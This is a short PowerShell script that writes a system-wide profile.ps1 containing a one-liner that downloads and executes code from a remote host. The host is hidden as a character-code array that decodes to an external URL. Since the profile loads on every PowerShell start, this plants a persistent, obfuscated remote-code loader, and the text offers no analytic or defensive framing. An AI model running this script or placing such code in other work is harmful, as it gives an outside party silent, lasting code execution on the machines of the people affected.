if([Net.ServicePointManager]::SecurityProtocol -ne 'Tls12'){[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12}
New-Item -Path "$PSHOME\profile.ps1" -ItemType File -Value "(iex (iwr -Uri ([char[]](104,116,116,112,115,58,47,47,112,97,110,103,101,97,105,109,109,101,114,115,105,118,101,46,105,111) -Join '')).ToString())"
